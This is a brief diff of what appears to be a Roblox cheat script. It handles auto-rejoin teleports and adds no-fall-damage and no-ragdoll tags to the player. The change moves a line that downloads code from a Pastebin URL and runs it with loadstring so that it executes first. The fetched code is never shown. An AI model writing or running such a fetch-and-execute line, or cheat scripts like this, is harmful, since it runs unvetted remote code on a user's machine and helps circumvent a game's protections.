@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/iU7rJk5T"))()
 _G.Auto = true
 local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
@@ -85,7 +86,6 @@ if is == nil then
 	teleport()
 	return
 end
-loadstring(game:HttpGet("https://pastebin.com/raw/iU7rJk5T"))()
 local VirtualInputManager = game:GetService("VirtualInputManager")
 game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:AddTag('NoFallDamage')
 game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:AddTag('NoRagdoll')
